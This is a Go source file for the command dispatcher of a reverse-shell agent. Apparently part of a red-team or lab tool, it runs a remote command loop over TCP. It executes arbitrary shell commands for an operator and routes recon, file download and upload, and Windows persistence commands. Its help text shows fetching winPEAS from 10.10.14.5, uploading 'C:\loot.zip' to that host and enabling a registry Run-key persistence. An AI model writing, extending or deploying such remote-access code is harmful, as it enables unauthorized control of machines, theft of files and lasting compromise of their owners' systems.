package Dispatcher

import (
	"fmt"
	"nombredetuapp/Documents/Proyecto/src/commands"
	"nombredetuapp/Documents/Proyecto/src/shell"
	"nombredetuapp/Documents/Proyecto/src/transport"
	"strings"
)

func HelpCommand(args []string) string {
	return `
┌──────────────────────────────────────────────────────────┐
│  AGENT COMMAND INTERFACE                                 │
└──────────────────────────────────────────────────────────┘

[RECON]
  recon [--quick|--full|--json]
    → System enumeration (intentionally AV-detected)

[FILE OPS]
  download <url> <destination>
    → Fetch file from HTTP server
  
  upload <source> <url>
    → Send file to HTTP server
  
  transfer <download|upload> [args]
    → Full file transfer interface

[PERSISTENCE]
  persistence <enable|disable|status> [strategy]
    → Manage Windows persistence mechanisms

[INFO]
  info
    → Display system information

[SHELL]
  <any command>
    → Execute in system shell (cmd.exe / bash)

───────────────────────────────────────────────────────────
Examples:
  recon --full
  download http://10.10.14.5/winPEAS.exe C:\Temp\winpeas.exe
  upload C:\loot.zip http://10.10.14.5/upload
  persistence enable registry_run_key
  ipconfig /all
───────────────────────────────────────────────────────────
`
}

func Run(t transport.TCPTransport) {
	sh := shell.NewShell()

	header := fmt.Sprintf("\n[+] Reverse Shell Connected! \n[+] Type 'exit' to terminate the session.\n[+] Type 'help' to see the available commands.\n[*] This works like a shell if the command is not in the list of custom commands. will be executed in the system shell.\n\n")
	t.Send([]byte(header))

	for {
		prompt := fmt.Sprintf(
			"[agent] %s > ",
			sh.GetCWD(),
		)
		t.Send([]byte(prompt))

		input, err := t.Read()
		if err != nil {
			break
		}

		cmdLine := strings.TrimSpace(string(input))
		if cmdLine == "" {
			continue
		}

		if cmdLine == "exit" {
			t.Send([]byte("Session closed.\n"))
			return
		}
		if cmdLine == "help" {
			helpOutput := HelpCommand([]string{})
			t.Send([]byte(helpOutput))
			continue
		}

		parts := strings.Fields(cmdLine)
		cmd := parts[0]
		args := parts[1:]
		if handler, exists := commands.Commands[cmd]; exists {
			output := handler(args)
			t.Send([]byte(output))
			continue
		}

		output := sh.Execute(string(cmdLine))
		if output != "" {
			t.Send([]byte(output))
		}
	}
}
